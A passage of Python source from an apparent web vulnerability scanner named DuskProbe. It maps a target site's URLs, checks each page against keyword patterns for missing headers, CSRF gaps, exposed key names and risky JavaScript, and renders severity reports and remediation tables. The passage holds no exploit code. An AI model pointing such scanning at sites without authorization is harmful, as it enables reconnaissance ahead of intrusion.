                    if (absolute_url.startswith(('http://', 'https://')) and 
                        not absolute_url.endswith(('#', 'javascript:', 'mailto:')) and
                        '#' not in absolute_url.split('/')[-1]):
                        urls.append(absolute_url)
                        
                except Exception:
                    continue
            
            return list(set(urls))  # Remove duplicates
            
        except Exception as e:
            self.config.logger.debug(f"URL extraction error: {e}")
            return []

    async def _analyze_website_structure(self, discovered_urls: List[str]) -> Dict:
        """Analyze the structure of discovered URLs"""
        structure_analysis = {
            'directory_structure': {},
            'file_types': {},
            'parameter_analysis': {},
            'depth_analysis': {},
            'common_patterns': []
        }
        
        try:
            import urllib.parse
            from collections import defaultdict
            
            # Directory structure analysis
            directories = defaultdict(list)
            file_types = defaultdict(int)
            depths = defaultdict(int)
            parameters = defaultdict(int)
            
            for url in discovered_urls:
                parsed = urllib.parse.urlparse(url)
                path_parts = [p for p in parsed.path.split('/') if p]
                
                # Directory analysis
                if len(path_parts) > 1:
                    directory = '/' + '/'.join(path_parts[:-1])
                    directories[directory].append(url)
                
                # File type analysis
                file_ext = self._get_file_extension(url)
                if file_ext:
                    file_types[file_ext] += 1
                
                # Depth analysis
                depth = len(path_parts)
                depths[depth] += 1
                
                # Parameter analysis
                if parsed.query:
                    param_count = len(parsed.query.split('&'))
                    parameters[param_count] += 1
            
            structure_analysis['directory_structure'] = dict(directories)
            structure_analysis['file_types'] = dict(file_types)
            structure_analysis['depth_analysis'] = dict(depths)
            structure_analysis['parameter_analysis'] = dict(parameters)
            
            # Common patterns detection
            patterns = []
            if any('admin' in url.lower() for url in discovered_urls):
                patterns.append("Administrative interfaces detected")
            if any('api' in url.lower() for url in discovered_urls):
                patterns.append("API endpoints discovered")
            if any('upload' in url.lower() for url in discovered_urls):
                patterns.append("File upload functionality found")
            if any('.php' in url.lower() for url in discovered_urls):
                patterns.append("PHP application detected")
            if any('.asp' in url.lower() for url in discovered_urls):
                patterns.append("ASP.NET application detected")
            
            structure_analysis['common_patterns'] = patterns
            
        except Exception as e:
            self.config.logger.debug(f"Structure analysis error: {e}")
        
        return structure_analysis

    async def _analyze_per_url_vulnerabilities(self, discovered_urls: List[str]) -> Dict:
        """Analyze vulnerabilities for each discovered URL individually"""
        per_url_analysis = {}
        
        try:
            # Limit analysis to prevent excessive scanning time
            urls_to_analyze = discovered_urls[:20]  # Analyze first 20 URLs
            
            for url in urls_to_analyze:
                url_vulnerabilities = {
                    'url': url,
                    'response_analysis': {},
                    'header_analysis': {},
                    'content_analysis': {},
                    'form_analysis': {},
                    'javascript_analysis': {},
                    'security_issues': [],
                    'risk_score': 0,
                    'vulnerability_count': 0
                }
                
                try:
                    # Fetch URL details
                    status, headers, content, final_url = await self.session.get(url)
                    
                    if status == 200 and content:
                        # Response analysis
                        url_vulnerabilities['response_analysis'] = {
                            'status_code': status,
                            'final_url': final_url,
                            'content_length': len(content),
                            'response_time': 'N/A',  # Would need timing implementation
                            'redirects': final_url != url
                        }
                        
                        # Header analysis
                        header_issues = await self._analyze_security_headers(headers)
                        url_vulnerabilities['header_analysis'] = header_issues
                        
                        # Content analysis
                        content_issues = await self._analyze_content_security(content, url)
                        url_vulnerabilities['content_analysis'] = content_issues
                        
                        # Form analysis
                        form_issues = await self._analyze_forms_security(content, url)
                        url_vulnerabilities['form_analysis'] = form_issues
                        
                        # JavaScript analysis
                        js_issues = await self._analyze_javascript_security(content)
                        url_vulnerabilities['javascript_analysis'] = js_issues
                        
                        # Compile security issues
                        all_issues = []
                        if header_issues.get('missing_headers'):
                            all_issues.extend(header_issues['missing_headers'])
                        if content_issues.get('security_concerns'):
                            all_issues.extend(content_issues['security_concerns'])
                        if form_issues.get('insecure_forms'):
                            all_issues.extend(form_issues['insecure_forms'])
                        if js_issues.get('potential_issues'):
                            all_issues.extend(js_issues['potential_issues'])
                        
                        url_vulnerabilities['security_issues'] = all_issues
                        url_vulnerabilities['vulnerability_count'] = len(all_issues)
                        
                        # Calculate risk score
                        risk_score = 0
                        risk_score += len(header_issues.get('missing_headers', [])) * 5
                        risk_score += len(content_issues.get('security_concerns', [])) * 10
                        risk_score += len(form_issues.get('insecure_forms', [])) * 15
                        risk_score += len(js_issues.get('potential_issues', [])) * 8
                        
                        url_vulnerabilities['risk_score'] = min(risk_score, 100)
                        
                except Exception as e:
                    url_vulnerabilities['error'] = str(e)
                
                per_url_analysis[url] = url_vulnerabilities
                
        except Exception as e:
            self.config.logger.debug(f"Per-URL vulnerability analysis error: {e}")
        
        return per_url_analysis

    async def _analyze_security_headers(self, headers: Dict) -> Dict:
        """Analyze security headers for vulnerabilities"""
        security_headers = {
            'X-Frame-Options': 'Missing - Clickjacking protection',
            'X-XSS-Protection': 'Missing - XSS protection',
            'X-Content-Type-Options': 'Missing - MIME type sniffing protection',
            'Strict-Transport-Security': 'Missing - HTTPS enforcement',
            'Content-Security-Policy': 'Missing - Content injection protection',
            'Referrer-Policy': 'Missing - Referrer information control',
            'Permissions-Policy': 'Missing - Feature policy control'
        }
        
        missing_headers = []
        present_headers = {}
        
        for header, description in security_headers.items():
            if header.lower() not in [h.lower() for h in headers.keys()]:
                missing_headers.append(f"{header}: {description}")
            else:
                present_headers[header] = headers.get(header, 'Present')
        
        return {
            'missing_headers': missing_headers,
            'present_headers': present_headers,
            'security_score': max(0, 100 - (len(missing_headers) * 15))
        }

    async def _analyze_content_security(self, content: str, url: str) -> Dict:
        """Analyze content for security issues"""
        security_concerns = []
        
        try:
            content_lower = content.lower()
            
            # Check for sensitive information exposure
            if 'password' in content_lower and 'type="password"' not in content_lower:
                security_concerns.append("Potential password exposure in content")
            
            if any(term in content_lower for term in ['api_key', 'secret_key', 'private_key']):
                security_concerns.append("Potential API key exposure")
            
            if 'error' in content_lower and any(db in content_lower for db in ['sql', 'mysql', 'postgresql']):
                security_concerns.append("Potential database error disclosure")
            
            if '<script>' in content_lower and 'eval(' in content_lower:
                security_concerns.append("Potential dangerous JavaScript execution")
            
            if 'document.cookie' in content_lower:
                security_concerns.append("JavaScript cookie manipulation detected")
            
            if any(comment in content for comment in ['<!--', '/*', '//']):
                security_concerns.append("Code comments present (potential information disclosure)")
            
            # Check for inline JavaScript
            inline_js_count = content_lower.count('<script>')
            if inline_js_count > 5:
                security_concerns.append(f"High number of inline scripts ({inline_js_count})")
            
        except Exception as e:
            self.config.logger.debug(f"Content security analysis error: {e}")
        
        return {
            'security_concerns': security_concerns,
            'content_length': len(content),
            'inline_script_count': content_lower.count('<script>') if 'content_lower' in locals() else 0
        }

    async def _analyze_forms_security(self, content: str, url: str) -> Dict:
        """Analyze forms for security issues"""
        insecure_forms = []
        form_count = 0
        
        try:
            import re
            
            # Find all forms
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, content, re.DOTALL | re.IGNORECASE)
            form_count = len(forms)
            
            for i, form in enumerate(forms):
                form_issues = []
                
                # Check for missing CSRF protection
                if 'csrf' not in form.lower() and 'token' not in form.lower():
                    form_issues.append("Missing CSRF protection")
                
                # Check for password fields over HTTP
                if 'type="password"' in form.lower() and not url.startswith('https://'):
                    form_issues.append("Password field over HTTP")
                
                # Check for autocomplete on sensitive fields
                if 'autocomplete="off"' not in form.lower() and 'password' in form.lower():
                    form_issues.append("Autocomplete enabled on sensitive fields")
                
                # Check for file upload without restrictions
                if 'type="file"' in form.lower():
                    if 'accept=' not in form.lower():
                        form_issues.append("File upload without type restrictions")
                
                if form_issues:
                    insecure_forms.append(f"Form {i+1}: {', '.join(form_issues)}")
        
        except Exception as e:
            self.config.logger.debug(f"Form security analysis error: {e}")
        
        return {
            'insecure_forms': insecure_forms,
            'total_forms': form_count,
            'security_score': max(0, 100 - (len(insecure_forms) * 20))
        }

    async def _analyze_javascript_security(self, content: str) -> Dict:
        """Analyze JavaScript for security issues"""
        potential_issues = []
        
        try:
            content_lower = content.lower()
            
            # Check for dangerous functions
            dangerous_functions = ['eval(', 'settimeout(', 'setinterval(', 'function(', 'innerhtml']
            for func in dangerous_functions:
                if func in content_lower:
                    potential_issues.append(f"Potentially dangerous function: {func}")
            
            # Check for external script sources
            if 'src=' in content_lower:
                external_scripts = content_lower.count('src=')
                if external_scripts > 10:
                    potential_issues.append(f"High number of external scripts ({external_scripts})")
            
            # Check for inline event handlers
            event_handlers = ['onclick=', 'onload=', 'onerror=', 'onmouseover=']
            for handler in event_handlers:
                if handler in content_lower:
                    potential_issues.append(f"Inline event handler: {handler}")
            
            # Check for document.write usage
            if 'document.write' in content_lower:
                potential_issues.append("document.write usage detected (potential XSS)")
        
        except Exception as e:
            self.config.logger.debug(f"JavaScript security analysis error: {e}")
        
        return {
            'potential_issues': potential_issues,
            'script_count': content_lower.count('<script>') if 'content_lower' in locals() else 0
        }

    def _get_file_extension(self, url: str) -> str:
        """Get file extension from URL"""
        try:
            import urllib.parse
            path = urllib.parse.urlparse(url).path
            if '.' in path:
                return path.split('.')[-1].lower()
            return ''
        except:
            return ''

    def _get_file_type(self, filename: str) -> str:
        """Get file type category"""
        try:
            import mimetypes
            mime_type, _ = mimetypes.guess_type(filename)
            if mime_type:
                return mime_type.split('/')[0]
            return 'unknown'
        except:
            return 'unknown'


# --- Reporting ---

class Report:
    """Advanced detailed report generation with comprehensive vulnerability analysis."""

    def __init__(self, config: DuskProbeConfig):
        self.config = config
        self.console = config.console
        self.findings = []

    def generate_report(self, scan_results: Dict):
        """Generate comprehensive detailed vulnerability report."""
        self.findings = scan_results.get('findings', [])
        self.site_info = scan_results.get('site_info', {})  # Store site info for technical display
        
        if not self.findings and not self.config.args.quiet:
            self.console.print("[bold green]✅ No vulnerabilities found![/bold green]")
            # Still show technical information even if no vulnerabilities found
            if not self.config.args.quiet:
                self._display_technical_intelligence()
                self._display_advanced_intelligence()
                self._display_comprehensive_discovery_analysis()
                self._display_website_structure_analysis()
                self._display_per_url_vulnerabilities()
            return

        if PD_AVAILABLE: 
            self.df = pd.DataFrame(self.findings)
        else: 
            self.df = None

        if not self.config.args.quiet:
            self._display_summary(scan_results)
            self._display_detailed_table()
            self._display_vulnerability_analysis()
            self._display_technical_intelligence()  # Add technical information display
            self._display_advanced_intelligence()  # Add advanced intelligence display
            self._display_comprehensive_discovery_analysis()  # Add comprehensive discovery analysis
            self._display_website_structure_analysis()  # Add website structure mapping display
            self._display_per_url_vulnerabilities()  # Add per-URL vulnerability analysis display
            self._display_remediation_guide()
            self._display_graph_visualizations()  # Add graph visualizations

        if self.config.args.output: 
            self._save_detailed_report()

    def _display_summary(self, scan_results: Dict):
        """Enhanced summary with comprehensive site information."""
        site_info = scan_results.get('site_info', {})
        
        # Enhanced summary with security posture assessment
        summary_text = f"[bold]Target URL:[/bold] {site_info.get('url', 'N/A')}\n"
        summary_text += f"[bold]IP Address:[/bold] {site_info.get('ip_address', 'N/A')}\n"
        summary_text += f"[bold]Server Software:[/bold] {site_info.get('server', 'N/A')}\n"
        summary_text += f"[bold]Total Security Checks:[/bold] {scan_results.get('total_checks', 'N/A')}\n"
        summary_text += f"[bold]Scan Duration:[/bold] {self._get_scan_duration()}\n"
        summary_text += f"[bold]Security Posture:[/bold] {self._assess_security_posture()}\n"
        
        if site_info.get('technologies'):
            summary_text += f"[bold]Detected Technologies:[/bold] {', '.join(site_info.get('technologies', []))}\n"
        
        summary_panel = Panel(
            summary_text.rstrip(),
            title="[bold cyan]🔍 Security Assessment Overview[/bold cyan]", 
            expand=False, 
            border_style="cyan"
        )
        self.console.print(summary_panel)

    def _display_detailed_table(self):
        """Display comprehensive vulnerability table with extensive details."""
        if not self.findings:
            return
            
        table = Table(
            title="[bold red]🚨 Comprehensive Vulnerability Analysis Report[/bold red]", 
            show_header=True, 
            header_style="bold magenta",
            expand=True
        )
        
        # Enhanced comprehensive columns with more detailed parameters
        table.add_column("Severity", style="dim", width=9)
        table.add_column("Category", width=20)
        table.add_column("Vulnerability Type", width=15)
        table.add_column("CVE/CWE", width=12)
        table.add_column("CVSS Score", width=8)
        table.add_column("Risk Score", width=8)
        table.add_column("OWASP 2025", width=18)
        table.add_column("Affected URL/Component", width=25)
        table.add_column("Exploit Difficulty", width=10)
        table.add_column("Attack Vector", width=10)
        table.add_column("Business Impact", width=15)
        table.add_column("Remediation Priority", width=12)
        table.add_column("Detection Time", width=12)
        table.add_column("Technical Details", width=20)

        severity_styles = {
            'CRITICAL': 'bold red on black', 
            'HIGH': 'red', 
            'MEDIUM': 'yellow', 
            'LOW': 'cyan', 
            'INFO': 'green'
        }
        
        # Sort by risk score for priority presentation
        sorted_findings = sorted(
            self.findings, 
            key=lambda x: (x.get('risk_score', 0), self._severity_to_num(x.get('severity', 'INFO'))), 
            reverse=True
        )
        
        for finding in sorted_findings:
            severity = finding.get('severity', 'INFO')
            style = severity_styles.get(severity, 'white')
            
            # Get comprehensive details with enhanced parameters
            category = self._truncate_text(finding.get('vulnerability_category', '🔍 Uncategorized'), 18)
            cve_cwe = f"CVE: {', '.join(finding.get('cve_references', ['N/A'])[:1])}\nCWE: {finding.get('cwe_id', 'N/A')}"
            cvss_score = f"{finding.get('cvss_score', 0.0):.1f}/10.0"
            risk_score = f"{finding.get('risk_score', 0)}/100"
            owasp_category = self._truncate_text(finding.get('owasp_category', 'N/A'), 16)
            
            # Enhanced URL/Component information with more details
            url = finding.get('url', 'N/A')
            component_details = finding.get('details', '')
            
            # Create comprehensive affected component description
            affected_component = f"{self._truncate_text(url, 20)}"
            if component_details and 'missing' in component_details.lower():
                header_name = component_details.replace('Missing ', '').replace('missing ', '')
                affected_component += f"\n📍 {self._truncate_text(header_name, 15)}"
            elif component_details:
                affected_component += f"\n🔍 {self._truncate_text(component_details, 15)}"
            
            # Enhanced technical details
            exploit_diff = finding.get('exploit_difficulty', 'Unknown')
            attack_vector = finding.get('attack_vector', 'Unknown')
            business_impact = self._truncate_text(finding.get('business_impact', self._assess_business_impact(finding)), 13)
            
            # New enhanced parameters
            remediation_priority = self._calculate_remediation_priority(finding)
            detection_time = self._format_detection_time(finding.get('timestamp', ''))
            technical_details = self._get_enhanced_technical_details(finding)
            
            table.add_row(
                f"[{style}]{severity}[/{style}]",
                category,
                self._truncate_text(finding.get('type', 'N/A'), 13),
                cve_cwe,
                cvss_score,
                risk_score,
                owasp_category,
                affected_component,
                exploit_diff,
                attack_vector,
                business_impact,
                remediation_priority,
                detection_time,
                technical_details
            )
        
        self.console.print(table)

    def _display_vulnerability_analysis(self):
        """Display detailed vulnerability analysis and statistics."""
        if not self.findings:
            return

        # Comprehensive statistics
        stats = self._calculate_comprehensive_stats()
        
        analysis_text = f"[bold]📊 Vulnerability Statistics:[/bold]\n"
        analysis_text += f"• Total Vulnerabilities: {stats['total']}\n"
        analysis_text += f"• Critical: {stats['critical']} | High: {stats['high']} | Medium: {stats['medium']} | Low: {stats['low']}\n"
        analysis_text += f"• Average CVSS Score: {stats['avg_cvss']:.1f}/10.0\n"
        analysis_text += f"• Average Risk Score: {stats['avg_risk']}/100\n"
        analysis_text += f"• Exploitable Vulnerabilities: {stats['exploitable']}\n"
        analysis_text += f"• Compliance Violations: {stats['compliance_issues']}\n\n"
        
        analysis_text += f"[bold]🎯 Attack Vector Analysis:[/bold]\n"
        for vector, count in stats['attack_vectors'].items():
            analysis_text += f"• {vector}: {count} vulnerabilities\n"
        
        analysis_text += f"\n[bold]📋 OWASP 2025 Category Breakdown:[/bold]\n"
        for category, count in stats['owasp_categories'].items():
            analysis_text += f"• {category}: {count} vulnerabilities\n"
        
        analysis_text += f"\n[bold]🏢 Business Impact Assessment:[/bold]\n"
        analysis_text += f"• Data Breach Risk: {stats['data_breach_risk']}\n"
        analysis_text += f"• Service Disruption Risk: {stats['service_disruption_risk']}\n"
        analysis_text += f"• Compliance Risk: {stats['compliance_risk']}\n"
        analysis_text += f"• Reputation Risk: {stats['reputation_risk']}\n"

        analysis_panel = Panel(
            analysis_text.rstrip(),
            title="[bold yellow]📈 Comprehensive Vulnerability Analysis[/bold yellow]",
            expand=False,
            border_style="yellow"
        )
        self.console.print(analysis_panel)

    def _display_remediation_guide(self):
        """Display detailed remediation guidance."""
        if not self.findings:
            return

        remediation_text = f"[bold]🔧 Priority Remediation Steps:[/bold]\n\n"
        
        # Group by vulnerability type and provide detailed remediation
        vuln_types = {}
        for finding in self.findings:
            vuln_type = finding.get('type', 'Unknown')
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(finding)
        
        priority_order = ['SQLi', 'OS Command Injection', 'XSS', 'LFI', 'SSRF', 'Sensitive File Exposure', 'Missing Header']
        
        for i, vuln_type in enumerate(priority_order, 1):
            if vuln_type in vuln_types:
                findings = vuln_types[vuln_type]
                remediation_text += f"[bold]{i}. {vuln_type} ({len(findings)} instances):[/bold]\n"
                remediation_text += f"   • {findings[0].get('remediation_steps', 'No specific remediation available')}\n"
                remediation_text += f"   • Technical Details: {findings[0].get('technical_details', 'No details available')}\n"
                remediation_text += f"   • Example: {findings[0].get('poc_example', 'No example available')}\n\n"
        
        remediation_text += f"[bold]🛡️ General Security Recommendations:[/bold]\n"
        remediation_text += f"• Implement Web Application Firewall (WAF)\n"
        remediation_text += f"• Regular security testing and code reviews\n"
        remediation_text += f"• Security awareness training for development team\n"
        remediation_text += f"• Implement security headers and HTTPS\n"
        remediation_text += f"• Regular security updates and patch management\n"

        remediation_panel = Panel(
            remediation_text.rstrip(),
            title="[bold green]🛠️ Detailed Remediation Guide[/bold green]",
            expand=False,
            border_style="green"
        )
        self.console.print(remediation_panel)

    def _calculate_remediation_priority(self, finding: Dict) -> str:
        """Calculate remediation priority based on multiple factors."""
        severity = finding.get('severity', 'INFO').upper()
        cvss_score = finding.get('cvss_score', 0.0)
        risk_score = finding.get('risk_score', 0)
        exploit_difficulty = finding.get('exploit_difficulty', 'Unknown').lower()
        
        # Calculate priority score
        priority_score = 0
        
        # Severity weight (40%)
        severity_weights = {'CRITICAL': 40, 'HIGH': 30, 'MEDIUM': 20, 'LOW': 10, 'INFO': 5}
        priority_score += severity_weights.get(severity, 5)
        
        # CVSS score weight (25%)
        priority_score += (cvss_score / 10.0) * 25
        
        # Risk score weight (25%)
        priority_score += (risk_score / 100.0) * 25
        
        # Exploit difficulty weight (10%) - easier exploitation = higher priority
        exploit_weights = {'easy': 10, 'medium': 6, 'hard': 3, 'unknown': 5}
        priority_score += exploit_weights.get(exploit_difficulty, 5)
        
        # Determine priority level
        if priority_score >= 80:
            return "🚨 URGENT"
        elif priority_score >= 60:
            return "⚠️ HIGH"
        elif priority_score >= 40:
            return "🔶 MEDIUM"
        elif priority_score >= 20:
            return "🔵 LOW"
        else:
            return "ℹ️ INFO"

    def _format_detection_time(self, timestamp: str) -> str:
        """Format detection timestamp for display."""
        if not timestamp:
            return "Unknown"
        
        try:
            from datetime import datetime
            # Parse ISO format timestamp
            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
            return dt.strftime("%H:%M:%S")
        except:
            return "Unknown"

    def _get_enhanced_technical_details(self, finding: Dict) -> str:
        """Get enhanced technical details for the vulnerability."""
        details = []
        
        # Add HTTP method if available
        method = finding.get('http_method', '')
        if method:
            details.append(f"Method: {method}")
        
        # Add parameter information
        parameter = finding.get('parameter', '')
        if parameter:
            details.append(f"Param: {parameter}")
        
        # Add payload information
        payload = finding.get('payload', '')
        if payload and len(payload) < 20:
            details.append(f"Payload: {payload}")
        
        # Add response code
        response_code = finding.get('response_code', '')
        if response_code:
            details.append(f"Status: {response_code}")
        
        # Add content type
        content_type = finding.get('content_type', '')
        if content_type:
            details.append(f"Type: {content_type.split(';')[0]}")
        
        # Add authentication requirement
        auth_required = finding.get('authentication_required', False)
        if auth_required:
            details.append("🔒 Auth Required")
        
        # Add encryption info
        encrypted = finding.get('encrypted', False)
        if encrypted:
            details.append("🔐 Encrypted")
        else:
            details.append("🔓 Plain")
        
        # Join details with line breaks for better display
        result = '\n'.join(details[:4])  # Limit to 4 details for space
        return result if result else "Standard Web"

    def _assess_business_impact(self, finding: Dict) -> str:
        """Assess business impact based on vulnerability characteristics."""
        severity = finding.get('severity', 'INFO').upper()
        vuln_type = finding.get('type', '').lower()
        
        # High impact vulnerabilities
        if severity in ['CRITICAL', 'HIGH']:
            if any(keyword in vuln_type for keyword in ['injection', 'authentication', 'authorization', 'rce']):
                return "💥 Critical Impact"
            elif any(keyword in vuln_type for keyword in ['xss', 'csrf', 'redirect']):
                return "⚠️ High Impact"
            else:
                return "🔴 Significant Impact"
        
        # Medium impact vulnerabilities
        elif severity == 'MEDIUM':
            if any(keyword in vuln_type for keyword in ['disclosure', 'leak', 'exposure']):
                return "🟡 Moderate Impact"
            else:
                return "📊 Medium Impact"
        
        # Low impact vulnerabilities
        elif severity == 'LOW':
            return "🔵 Low Impact"
        
        # Info level
        else:
            return "ℹ️ Minimal Impact"

    def _calculate_comprehensive_stats(self) -> Dict:
        """Calculate comprehensive vulnerability statistics."""
        stats = {
            'total': len(self.findings),
            'critical': 0, 'high': 0, 'medium': 0, 'low': 0,
            'avg_cvss': 0.0, 'avg_risk': 0,
            'exploitable': 0, 'compliance_issues': 0,
            'attack_vectors': {}, 'owasp_categories': {},
            'data_breach_risk': 'Unknown',
            'service_disruption_risk': 'Unknown', 'compliance_risk': 'Unknown',
            'reputation_risk': 'Unknown'
        }
        
        if not self.findings:
            return stats
        
        total_cvss = 0
        total_risk = 0
        
        for finding in self.findings:
            # Severity counts
            severity = finding.get('severity', 'INFO').lower()
            if severity == 'critical':
                stats['critical'] += 1
            elif severity == 'high':
                stats['high'] += 1
            elif severity == 'medium':
                stats['medium'] += 1
            elif severity == 'low':
                stats['low'] += 1
            
            # Score calculations
            total_cvss += finding.get('cvss_score', 0.0)
            total_risk += finding.get('risk_score', 0)
            
            # Exploitability
            if finding.get('exploit_difficulty') == 'Easy':
                stats['exploitable'] += 1
            
            # Attack vectors
            vector = finding.get('attack_vector', 'Unknown')
            stats['attack_vectors'][vector] = stats['attack_vectors'].get(vector, 0) + 1
            
            # OWASP 2025 categories
            category = finding.get('vulnerability_category', '🔍 Uncategorized')
            stats['owasp_categories'][category] = stats['owasp_categories'].get(category, 0) + 1
            
            # Compliance issues
            if 'PCI' in finding.get('compliance_impact', '') or 'GDPR' in finding.get('compliance_impact', ''):
                stats['compliance_issues'] += 1
        
        # Calculate averages
        if self.findings:
            stats['avg_cvss'] = total_cvss / len(self.findings)
            stats['avg_risk'] = total_risk // len(self.findings)
        
        # Risk assessments
        if stats['critical'] > 0:
            stats['data_breach_risk'] = 'CRITICAL'
            stats['service_disruption_risk'] = 'HIGH'
            stats['compliance_risk'] = 'HIGH'
            stats['reputation_risk'] = 'HIGH'
        elif stats['high'] > 2:
            stats['data_breach_risk'] = 'HIGH'
            stats['service_disruption_risk'] = 'MEDIUM'
            stats['compliance_risk'] = 'MEDIUM'
            stats['reputation_risk'] = 'MEDIUM'
        else:
            stats['data_breach_risk'] = 'LOW'
            stats['service_disruption_risk'] = 'LOW'
            stats['compliance_risk'] = 'LOW'
            stats['reputation_risk'] = 'LOW'
        
        return stats

    def _severity_to_num(self, severity: str) -> int:
        """Convert severity to number for sorting."""
        severity_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'INFO': 0}
        return severity_order.get(severity.upper(), 0)

    def _truncate_text(self, text: str, max_length: int) -> str:
        """Truncate text to fit in table columns."""
        if len(text) <= max_length:
            return text
        return text[:max_length-3] + "..."

    def _get_scan_duration(self) -> str:
        """Get scan duration (placeholder)."""
        return "< 1 minute"

    def _assess_security_posture(self) -> str:
        """Assess overall security posture."""
        if not self.findings:
            return "[green]EXCELLENT[/green]"
        
        critical_count = sum(1 for f in self.findings if f.get('severity') == 'CRITICAL')
        high_count = sum(1 for f in self.findings if f.get('severity') == 'HIGH')
        
        if critical_count > 0:
            return "[red]CRITICAL - Immediate Action Required[/red]"
        elif high_count > 2:
            return "[yellow]POOR - Multiple High-Risk Issues[/yellow]"
        elif high_count > 0:
            return "[orange]FAIR - Some Security Concerns[/orange]"
        else:
            return "[green]GOOD - Minor Issues Only[/green]"

    def _display_graph_visualizations(self):
        """Display comprehensive graph visualizations using termgraph."""
        if not TERMGRAPH_AVAILABLE:
            return
            
        self.console.print("\n")
        
        # Display vulnerability severity distribution
        self._display_severity_distribution_graph()
        
        # Display OWASP category breakdown
        self._display_owasp_category_graph()
        
        # Display CVSS score distribution
        self._display_cvss_score_graph()
        
        # Display attack vector analysis
        self._display_attack_vector_graph()
        
        # Display remediation priority graph
        self._display_remediation_priority_graph()

    def _display_severity_distribution_graph(self):
        """Display enhanced vulnerability severity distribution with table-based UI."""
        if not self.findings:
            return
            
        # Count vulnerabilities by severity with detailed analytics
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        severity_cvss = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': [], 'INFO': []}
        severity_types = {'CRITICAL': set(), 'HIGH': set(), 'MEDIUM': set(), 'LOW': set(), 'INFO': set()}
        
        for finding in self.findings:
            severity = finding.get('severity', 'INFO').upper()
            if severity in severity_counts:
                severity_counts[severity] += 1
                severity_cvss[severity].append(finding.get('cvss_score', 0.0))
                severity_types[severity].add(finding.get('type', 'Unknown'))
        
        # Filter out zero counts
        data = [(k, v) for k, v in severity_counts.items() if v > 0]
        
        if not data:
            return
        
        total_vulns = sum(severity_counts.values())
        
        self.console.print(Panel(
            "[bold cyan]📊 Enhanced Vulnerability Severity Distribution & Analytics[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for severity distribution
        from rich.table import Table
        
        severity_table = Table(title="🎯 Vulnerability Severity Distribution", show_header=True, header_style="bold magenta")
        severity_table.add_column("Severity", style="bold", width=12)
        severity_table.add_column("Visual Distribution", width=40)
        severity_table.add_column("Count", justify="center", width=8)
        severity_table.add_column("Percentage", justify="center", width=12)
        severity_table.add_column("Avg CVSS", justify="center", width=10)
        severity_table.add_column("Types", justify="center", width=8)
        severity_table.add_column("Priority", width=15)
        
        # Color and style mapping
        severity_colors = {
            'CRITICAL': 'red',
            'HIGH': 'orange1', 
            'MEDIUM': 'yellow',
            'LOW': 'green',
            'INFO': 'blue'
        }
        
        risk_indicators = {
            'CRITICAL': '🚨 URGENT',
            'HIGH': '⚠️ PRIORITY', 
            'MEDIUM': '🔶 MODERATE',
            'LOW': '✅ MINOR',
            'INFO': 'ℹ️ NOTICE'
        }
        
        max_count = max(count for _, count in data) if data else 1
        
        for severity, count in sorted(data, key=lambda x: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'].index(x[0])):
            percentage = (count / total_vulns) * 100
            color = severity_colors.get(severity, 'white')
            risk_indicator = risk_indicators.get(severity, '')
            
            # Calculate average CVSS for this severity
            avg_cvss = sum(severity_cvss[severity]) / len(severity_cvss[severity]) if severity_cvss[severity] else 0.0
            unique_types = len(severity_types[severity])
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 35)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (35 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            severity_table.add_row(
                f"[{color}]{severity}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{avg_cvss:.1f}[/{color}]",
                f"[{color}]{unique_types}[/{color}]",
                f"[{color}]{risk_indicator}[/{color}]"
            )
        
        self.console.print(severity_table)
        
        # Analytics summary table
        analytics_table = Table(title="📈 Comprehensive Analytics Summary", show_header=True, header_style="bold cyan")
        analytics_table.add_column("Metric", style="bold yellow", width=25)
        analytics_table.add_column("Value", style="bold white", width=15)
        analytics_table.add_column("Analysis", style="cyan", width=50)
        
        # Calculate comprehensive metrics
        total_unique_types = len(set(f.get('type', 'Unknown') for f in self.findings))
        avg_cvss_all = sum(f.get('cvss_score', 0.0) for f in self.findings) / len(self.findings) if self.findings else 0.0
        most_common = max(data, key=lambda x: x[1]) if data else ('N/A', 0)
        high_risk_issues = sum(count for severity, count in data if severity in ['CRITICAL', 'HIGH'])
        high_risk_percentage = (high_risk_issues / total_vulns) * 100 if total_vulns > 0 else 0
        
        analytics_table.add_row(
            "🎯 Total Vulnerabilities", 
            str(total_vulns), 
            "Complete vulnerability count across all severity levels"
        )
        analytics_table.add_row(
            "🔍 Unique Vuln Types", 
            str(total_unique_types), 
            "Diverse attack vectors requiring different remediation approaches"
        )
        analytics_table.add_row(
            "📊 Average CVSS Score", 
            f"{avg_cvss_all:.1f}/10.0", 
            "Overall risk assessment based on CVSS v3.1 scoring methodology"
        )
        analytics_table.add_row(
            "⚡ Most Common Severity", 
            f"{most_common[0]} ({most_common[1]})", 
            "Primary security concern requiring focused remediation effort"
        )
        analytics_table.add_row(
            "🚨 High-Risk Distribution", 
            f"{high_risk_percentage:.1f}%", 
            "Critical and high-severity issues needing immediate attention"
        )
        
        # Risk posture assessment
        if high_risk_percentage >= 50:
            risk_status = "[red]🚨 CRITICAL[/red]"
            risk_desc = "Emergency security response required - multiple critical issues"
        elif high_risk_percentage >= 25:
            risk_status = "[orange1]⚠️ HIGH RISK[/orange1]"
            risk_desc = "Accelerated remediation timeline needed for security issues"
        elif high_risk_percentage >= 10:
            risk_status = "[yellow]� MODERATE[/yellow]"
            risk_desc = "Standard security maintenance cycle with priority focus"
        else:
            risk_status = "[green]✅ LOW RISK[/green]"
            risk_desc = "Normal security posture with routine maintenance needed"
            
        analytics_table.add_row(
            "🛡️ Security Posture", 
            risk_status, 
            risk_desc
        )
        
        self.console.print("\n")
        self.console.print(analytics_table)

    def _display_owasp_category_graph(self):
        """Display comprehensive OWASP 2025 category breakdown with table-based UI."""
        if not self.findings:
            return
